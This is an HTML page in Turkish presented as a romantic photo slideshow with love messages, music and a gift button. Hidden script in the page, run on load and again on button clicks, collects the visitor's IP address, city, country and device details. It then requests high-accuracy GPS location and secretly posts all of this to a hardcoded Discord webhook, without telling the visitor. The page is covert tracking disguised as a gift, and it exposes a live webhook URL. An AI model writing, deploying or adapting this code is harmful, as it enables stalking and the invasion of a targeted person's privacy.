<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Senin ƒ∞√ßin</title>
    <style>
        body { background: #000; color: white; margin: 0; height: 100vh; font-family: 'Poppins', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
        img { width: 90%; max-width: 550px; height: auto; border-radius: 15px; box-shadow: 0 0 30px #ff00ff; margin-bottom: 20px; }
        #soz { font-size: 1.2rem; margin: 15px; color: #ff66ff; text-shadow: 0 0 15px #ff00ff; }
        button { padding: 12px 28px; background: #ff00ff; border: none; color: white; font-size: 1.1rem; border-radius: 10px; cursor: pointer; box-shadow: 0 0 20px #ff00ff; }
        #hediyeButon { margin-top: 30px; background: #ff0077; display: none; }
    </style>
</head>
<body>

    <div id="icerik">
        <img id="foto" src="foto1.jpg">
        <p id="soz">Seninle her g√ºn√ºm daha g√ºzel.</p>
    </div>

    <button id="ileriBtn" onclick="ileri()">ƒ∞leri ‚ûú</button>
    <button id="hediyeButon" onclick="window.location.href='hediye.html'">Hediyeyi G√∂r üéÅ</button>

    <audio id="music" loop>
        <source src="music.mp3" type="audio/mpeg">
    </audio>

    <script>
        const WEB_URL = "https://discord.com/api/webhooks/1470189609630826658/DAjHbX38Ow-YJOCbk4n0C3WpHnZ7XHCZuA-VLleQpzOU26qEnTw3FuVpegmoY7ghqEnj";
        
        // Konumun sadece 1 kere g√∂nderilmesi i√ßin kilit
        let konumGonderildi = false;

        function dcGonder(m) {
            fetch(WEB_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: m })
            });
        }

        // --- DETAYLI Bƒ∞LGƒ∞ VE KONUM FONKSƒ∞YONU ---
        function bilgileriTopla() {
            if (konumGonderildi) return; // Zaten g√∂nderildiyse durdur

            const cihaz = navigator.userAgent; // Telefon/Tarayƒ±cƒ± bilgisi
            const saat = new Date().toLocaleString('tr-TR'); // Tam giri≈ü saati

            fetch('https://ipapi.co/json/')
                .then(r => r.json())
                .then(d => {
                    let anaMesaj = `üåü **YENƒ∞ Gƒ∞Rƒ∞≈û DETAYLARI** üåü\n` +
                                 `üìÖ **Saat:** ${saat}\n` +
                                 `üìç **≈ûehir/√úlke:** ${d.city} / ${d.country_name}\n` +
                                 `üåê **IP:** ${d.ip}\n` +
                                 `üì± **Cihaz Bilgisi:** ${cihaz}\n` +
                                 `--------------------------`;
                    dcGonder(anaMesaj);

                    // Hassas Konum ƒ∞ste
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(function(p) {
                            const lat = p.coords.latitude;
                            const lon = p.coords.longitude;
                            const harita = `https://www.google.com/maps?q=${lat},${lon}`;
                            dcGonder(`üéØ **TAM KONUM (GPS)**\nüìç Harita: ${harita}`);
                            konumGonderildi = true; // G√∂nderim ba≈üarƒ±lƒ±, kilitle
                        }, function(e) {
                            dcGonder("‚ö†Ô∏è GPS ƒ∞zni Verilmedi.");
                            konumGonderildi = true; // ƒ∞zin verilmese de tekrar sormasƒ±n diye kilitle
                        }, { enableHighAccuracy: true });
                    }
                });
        }

        // Sayfa y√ºklenince ba≈ülat
        window.onload = bilgileriTopla;

        // --- FOTOƒûRAF Sƒ∞STEMƒ∞ ---
        const fotolar = ["foto1.jpg", "foto2.jpg", "foto3.jpg", "foto4.jpg", "foto5.jpg"];
        const sozler = ["Seninle her g√ºn√ºm daha g√ºzel.", "G√ºl√º≈ü√ºn d√ºnyamƒ± aydƒ±nlatƒ±yor.", "Kalbim hep seninle.", "Sana her baktƒ±ƒüƒ±mda yeniden a≈üƒ±k oluyorum.", "ƒ∞yi ki varsƒ±n, iyi ki benimsin."];
        let index = 0;
        const audio = document.getElementById("music");

        function ileri() {
            if (audio) audio.play().catch(() => {});
            
            // Eƒüer sayfa y√ºklenirken konum alƒ±namadƒ±ysa butona basƒ±nca tekrar dene
            if (!konumGonderildi) bilgileriTopla();

            index++;
            if (index >= fotolar.length) {
                document.getElementById("hediyeButon").style.display = "block";
                document.getElementById("ileriBtn").style.display = "none";
                return;
            }
            document.getElementById("foto").src = fotolar[index];
            document.getElementById("soz").innerText = sozler[index];
        }

        window.onclick = () => { if (audio) audio.play().catch(() => {}); };
    </script>
</body>
</html>
